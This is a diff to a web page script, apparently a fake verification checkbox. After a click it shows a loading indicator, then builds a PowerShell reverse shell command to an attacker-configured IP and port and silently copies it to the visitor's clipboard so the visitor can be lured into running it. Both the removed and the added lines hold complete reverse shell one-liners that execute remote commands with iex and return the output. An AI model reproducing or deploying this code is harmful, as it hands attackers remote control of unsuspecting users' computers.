@@ -378,7 +378,7 @@ checkbox.addEventListener('click', () => {
         loading.style.display = 'block'; // Show loading
         setTimeout(() => {
             // Generate the PowerShell reverse shell command dynamically
-            const payload = `powershell -w hidden -noni -nop -c "\$c=New-Object Net.Sockets.TCPClient('${CONFIG.ip}',${CONFIG.port});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length)) -ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i); \$sb=(iex \$d 2>&1 | Out-String ); \$sb2=\$sb + 'PS ' + (pwd).Path + '> '; \$s.Write(([text.encoding]::ASCII).GetBytes(\$sb2),0,\$sb2.Length);\$s.Flush()}\"`;
+            const payload = `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(`${CONFIG.ip}`,`${CONFIG.port}`);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`;
 
             // Copy the dynamically generated payload to clipboard
             navigator.clipboard.writeText(payload).then(() => {
